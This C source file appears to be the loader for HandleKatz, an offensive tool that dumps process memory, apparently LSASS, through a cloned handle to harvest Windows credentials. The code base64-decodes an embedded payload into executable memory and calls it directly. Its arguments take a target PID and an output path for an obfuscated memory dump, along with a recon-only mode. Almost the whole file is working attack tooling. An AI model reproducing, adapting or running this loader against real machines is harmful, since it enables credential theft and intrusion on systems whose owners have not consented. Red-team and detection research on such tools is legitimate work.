#include "HandleKatz.h"

#include <stdio.h>

void help(char**);
void args(PBOOL b_only_recon, char** pptr_path_dmp, PDWORD ptr_pid, int argc, char** argv);

int 
main(int argc, char** argv) {
    
    uint8_t* ptr_handlekatz = NULL;
    DWORD dw_len_handleKatz = 0, dw_len_handlekatz_b64 = 0, dw_success = 0, dw_pid = 0;
    char* ptr_output = NULL, *ptr_pth_dmp = NULL;
    BOOL b_recon_only = FALSE;

    args(&b_recon_only, &ptr_pth_dmp, &dw_pid, argc, argv);

    printf("[*] Recon only: %d\n", b_recon_only);
    printf("[*] Path dmp: %s\n", ptr_pth_dmp);
    printf("[*] Pid to clone from: %d\n", dw_pid);

    dw_len_handlekatz_b64 = lstrlenA(handlekatz_b64);
    dw_success = CryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, NULL, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success)
        goto cleanup;

    ptr_handlekatz = (uint8_t*)VirtualAlloc(0, dw_len_handleKatz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ptr_handlekatz == NULL)
        goto cleanup;

    dw_success = CryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, ptr_handlekatz, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success)
        goto cleanup;

    ptr_output = (char*)VirtualAlloc(0, 0x4096, MEM_COMMIT, PAGE_READWRITE);

    dw_success = ((HandleKatz*)ptr_handlekatz)(b_recon_only, ptr_pth_dmp, dw_pid, ptr_output);
    printf("[*] HandleKatz return value: %d\n", dw_success);
    printf("[*] HandleKatz output:\n\n");
    printf("%s\n", ptr_output);

cleanup:

    return 0;

}

void 
args(PBOOL b_only_recon, char** pptr_path_dmp, PDWORD ptr_pid, int argc, char** argv){

    if (argc != 2 && argc != 3)
        help(argv);

    if (strstr(argv[1], "--recon"))
        *b_only_recon = TRUE;
    else {

        for (int i = 1; i < argc; i++) {

            if (strstr(argv[i], "--pid"))
                *ptr_pid = atoi(strstr(argv[i], ":") + 1);

            if (strstr(argv[i], "--outfile"))
                *pptr_path_dmp = strstr(argv[i], ":") + 1;

        }
    }

}

void
help(char** argv) {

    printf("%s {--recon} {--pid:[pid to clone from] --outfile:[path to obfuscated dmp]\n", argv[0]);
    exit(0);

}